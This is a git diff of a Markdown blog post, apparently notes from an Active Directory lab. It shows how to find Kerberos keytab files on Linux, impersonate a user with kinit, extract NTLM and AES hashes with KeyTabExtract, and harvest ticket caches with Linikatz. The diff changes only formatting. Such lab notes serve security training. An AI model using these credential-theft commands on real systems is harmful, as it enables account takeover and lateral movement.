@@ -1,21 +1,28 @@
 ---
-title: "PTT : KeyTab File Abuse"
+title: 'PTT : KeyTab File Abuse'
 date: 2025-11-29 21:23:46
+
 categories:
   - Active Directory
   - Linux
   - Post Exploitation
   - Pass the Ticket (Ptt)
   - KeyTab File Abuse
+
 tags:
   - klist
   - kinit
   - KeyTabExtract
+
+cover: /img/ptt.png
+top_img: /img/bg-img.jpg
+description:
 ---
 
 # Finding Keytab files
 
-#### Note:
+
+#### Note: 
 
 `➜ To use a keytab file, we must have read and write (rw) privileges on the file.`
 
@@ -38,12 +45,13 @@ find / -name *keytab* -ls 2>/dev/null
 crontab -l
 
 # Edit this file to introduce tasks to be run by cron.
-#
+# 
 ...SNIP...
-#
+# 
 # m h  dom mon dow   command
 *5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
 ```
+
 
 ```bash
 cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
@@ -55,14 +63,15 @@ kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.s
 smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
 ```
 
-# KeyTab File Abuse
 
+
+# KeyTab File Abuse
 ## Impersonating User With KeyTab
 
 #### Listing KeyTab file information
 
 ```bash
-klist -k -t /opt/specialfiles/carlos.keytab
+klist -k -t /opt/specialfiles/carlos.keytab 
 
 Keytab name: FILE:/opt/specialfiles/carlos.keytab
 KVNO Timestamp           Principal
@@ -79,7 +88,7 @@ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
 ```
 
 ```bash
-klist
+klist 
 
 Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
 Default principal: carlos@INLANEFREIGHT.HTB
@@ -103,14 +112,15 @@ smbclient //dc01/carlos -k -c ls
                 7706623 blocks of size 4096. 4452852 blocks available
 ```
 
+
 ## Extract NTLM Hash From Keytab
 
 #### Extracting KeyTab hashes with KeyTabExtract
 
-[KeyTabExtract](<https://github.com/sosdave/KeyTabExtract>) will extract information such as the realm, Service Principal, Encryption Type, and Hashes.
+ [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) will extract information such as the realm, Service Principal, Encryption Type, and Hashes.
 
 ```bash
-python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
 
 [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
 [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
@@ -125,19 +135,22 @@ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
 
 `➜ Then we can perform pass hash attack or crack the ntlm hash`
 
+
 # Automated Harvesting Of Ccache Files
 
 ## Linikatz
 
 `➜ It requires root access and extracts credentials (including Kerberos tickets) from services like FreeIPA, SSSD, Samba, and others.`
 
+
 ```bash
 [!bash!]$ /opt/linikatz.sh
+
 
 Valid starting       Expires              Service principal
 10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
     renew until 10/11/2022 19:48:03, Flags: RIA
-    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types:
+    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
 I: [kerberos-check] User Kerberos tickets
 Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
 Default principal: julio@INLANEFREIGHT.HTB
